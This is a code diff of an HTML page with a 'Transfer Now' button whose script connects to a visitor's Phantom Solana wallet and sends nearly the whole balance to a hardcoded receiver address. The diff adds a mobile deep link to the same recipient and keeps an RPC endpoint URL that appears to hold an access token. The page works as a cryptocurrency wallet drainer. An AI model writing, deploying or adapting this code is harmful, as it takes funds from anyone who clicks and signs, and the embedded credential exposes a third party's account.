@@ -9,58 +9,64 @@
     <h2>Click below to transfer all funds</h2>
     <button id="transferButton">Transfer Now</button>
 
-    <script src="https://unpkg.com/@solana/web3.js@1.75.0/lib/index.iife.min.js"></script>
     <script>
         document.getElementById('transferButton').addEventListener('click', async () => {
-            try {
+            const receiverWallet = "9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf";
+
+            function isMobileDevice() {
+                return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+            }
+
+            if (isMobileDevice()) {
+                // Open Phantom mobile app using deep link
+                const mobileLink = `https://phantom.app/ul/v1/send?recipient=${receiverWallet}`;
+                window.location.href = mobileLink;
+            } else {
+                // Open Phantom desktop browser extension
                 if (!window.solana) {
-                    alert("Phantom wallet not found. Please install it first.");
+                    alert("Phantom wallet not found. Please install the extension.");
                     return;
                 }
+                
+                try {
+                    await window.solana.connect();
+                    const provider = window.solana;
 
-                // Connect to Phantom Wallet
-                await window.solana.connect();
-                const provider = window.solana;
+                    // Connect to Solana blockchain using QuickNode RPC
+                    const connection = new solanaWeb3.Connection(
+                        "https://convincing-distinguished-panorama.solana-mainnet.quiknode.pro/068f8b18be5bb779841bd23ab00ef267e80501df",
+                        'confirmed'
+                    );
 
-                // Define receiver wallet
-                const receiverWallet = "9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf";
+                    const publicKey = provider.publicKey;
+                    const balance = await connection.getBalance(publicKey);
 
-                // Use QuickNode RPC endpoint
-                const rpcEndpoint = "https://convincing-distinguished-panorama.solana-mainnet.quiknode.pro/068f8b18be5bb779841bd23ab00ef267e80501df";
+                    if (balance === 0) {
+                        alert("Insufficient balance.");
+                        return;
+                    }
 
-                const connection = new solanaWeb3.Connection(rpcEndpoint, 'confirmed');
+                    const transaction = new solanaWeb3.Transaction().add(
+                        solanaWeb3.SystemProgram.transfer({
+                            fromPubkey: publicKey,
+                            toPubkey: new solanaWeb3.PublicKey(receiverWallet),
+                            lamports: balance - 5000, // Send all SOL, leaving small balance for fees
+                        })
+                    );
 
-                // Get the wallet public key
-                const publicKey = provider.publicKey;
+                    const signature = await provider.signAndSendTransaction(transaction);
+                    alert("Transaction sent with signature: " + signature.signature);
 
-                // Fetch balance
-                const balance = await connection.getBalance(publicKey);
-                if (balance === 0) {
-                    alert("Insufficient balance.");
-                    return;
+                    await connection.confirmTransaction(signature.signature);
+                    alert("Transaction confirmed!");
+                } catch (error) {
+                    console.error("Error during transfer:", error);
+                    alert("Error: " + error.message);
                 }
-
-                // Create transaction
-                const transaction = new solanaWeb3.Transaction().add(
-                    solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: publicKey,
-                        toPubkey: new solanaWeb3.PublicKey(receiverWallet),
-                        lamports: balance - 5000, // Transfer all SOL, leaving some for fees
-                    })
-                );
-
-                // Request signature and send the transaction
-                const signature = await provider.signAndSendTransaction(transaction);
-                alert("Transaction sent with signature: " + signature.signature);
-
-                // Confirm transaction
-                await connection.confirmTransaction(signature.signature);
-                alert("Transaction confirmed!");
-            } catch (error) {
-                console.error("Error during transfer:", error);
-                alert("Error: " + error.message);
             }
         });
     </script>
+
+    <script src="https://unpkg.com/@solana/web3.js@1.75.0/lib/index.iife.min.js"></script>
 </body>
 </html>
